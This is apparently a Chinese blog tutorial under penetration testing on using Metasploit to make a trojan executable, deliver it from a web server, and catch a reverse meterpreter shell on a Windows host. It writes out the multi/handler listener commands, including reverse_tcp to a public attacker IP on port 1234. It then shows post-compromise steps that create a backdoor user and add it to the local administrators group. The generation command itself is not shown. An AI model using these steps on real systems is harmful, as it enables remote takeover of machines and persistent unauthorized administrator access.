msf写木马拿windows的shell
发表于 2020-02-28| 更新于 2020-03-17|渗透测试
阅读量:

利用msf写木马程序，然后攻击夺得windows主机shell。

环境准备

攻击机：我的一个服务器 IP：39...61
靶机:本机 ip：**

一：生成yogurt.exe木马文件


这里边的ip LHOST是攻击机的IP（我这里写的服务器公网ip，如果写私网ip不好使）

由于要用自己的windows电脑得到exe文件并运行，所以我把服务器的yogurt.exe放到服务器www下 ，这样浏览器访问服务器便可下载exe到本机。（我也不知道别的方法……）

二

进入监听模块:msf5 > use exploit/multi/handler
设置payload反弹:msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
设置LHOST,LPORT参数:msf5 exploit(multi/handler) > set LHOST 39.100.158.61
set LPORT 1234
开始攻击：exploit

三

这时候本机运行exe
在攻击机上就会显示攻击成功
然后就可以进行后续操作了，想干嘛干嘛

新建管理员用户

进入shell页面后，查看用户
C:\Users\Administrator\Desktop>net user

Administrator Guest yogurt

然后新建一个用户：
C:\Users\Administrator\Desktop>net user dawang 123456 /add
可以net user确认一下是否建成

把dawang用户加入管理组：
C:\Users\Administrator\Desktop>net localgroup administrators dawang /add
然后查看一下：
net user dawang
